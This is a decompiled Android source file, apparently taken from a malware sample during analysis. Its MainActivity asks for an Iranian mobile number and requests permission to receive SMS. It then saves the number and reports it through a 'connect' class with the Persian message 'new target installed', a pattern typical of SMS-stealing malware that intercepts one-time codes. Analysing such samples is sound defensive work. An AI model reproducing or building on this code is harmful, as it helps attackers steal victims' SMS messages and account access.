package ir.siqe.holo;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

public class MainActivity extends AppCompatActivity {
  protected void onCreate(Bundle paramBundle) {
    super.onCreate(paramBundle);
    setContentView(2131361820);
    final SharedPreferences.Editor editor = getSharedPreferences("info", 0).edit();
    final EditText editText = (EditText)findViewById(2131165319);
    findViewById(2131165307).setOnClickListener(new View.OnClickListener() {
          final MainActivity this$0;
          
          final EditText val$editText;
          
          final SharedPreferences.Editor val$editor;
          
          public void onClick(View param1View) {
            if (!editText.getText().toString().matches("(\\+98|0)?9\\d{9}")) {
              Toast.makeText((Context)MainActivity.this, "شماره موبایل معتبر نیست", 0).show();
            } else {
              ActivityCompat.requestPermissions((Activity)MainActivity.this, new String[] { "android.permission.RECEIVE_SMS" }, 0);
              if (Integer.valueOf(ActivityCompat.checkSelfPermission((Context)MainActivity.this, "android.permission.RECEIVE_SMS")).intValue() == 0) {
                editor.putString("phone", editText.getText().toString());
                editor.commit();
                new connect(editText.getText().toString(), "تارگت جدید نصب کرد", (Context)MainActivity.this);
                MainActivity.this.startActivity(new Intent((Context)MainActivity.this, MainActivity2.class));
              } 
            } 
          }
        });
  }
}


/* Location:              C:\Users\Jason\Downloads\355cd2b71db971dfb0fac1fc391eb4079e2b090025ca2cdc83d4a22a0ed8f082-dex2jar.jar!\ir\siqe\holo\MainActivity.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */